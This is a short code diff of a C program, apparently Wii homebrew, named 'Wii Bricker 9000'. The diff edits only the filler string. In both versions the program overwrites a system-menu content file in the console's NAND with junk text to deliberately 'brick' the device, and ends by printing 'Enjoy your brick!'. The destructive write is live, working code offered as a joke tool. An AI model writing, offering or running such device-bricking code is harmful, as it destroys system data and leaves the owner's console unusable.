@@ -44,7 +44,7 @@ int main(int argc, char **argv) {
 		printf("\n\tWii Bricker 9000");
 		printf("\n=================================================================================");
 		printf("\n\tCorrupting /title/00000001/00000002/content/0000009a.app...");
-		NAND_WriteFile("/title/00000001/00000002/content/0000009a.app", "OwO UwU OwO UwU OwO UwU OwO UwU OwO UwU OwO UwU OwO UwU OwO UwU OwO UwU OwO UwU OwO UwU OwO");
+		NAND_WriteFile("/title/00000001/00000002/content/0000009a.app", "OwO UwU OwO UwU OwO UwU OwO UwU OwO UwU OwO UwU OwO UwU OwO UwU");
 		printf("\n\n\tDone! Enjoy your brick! UwU");
 	}
 }
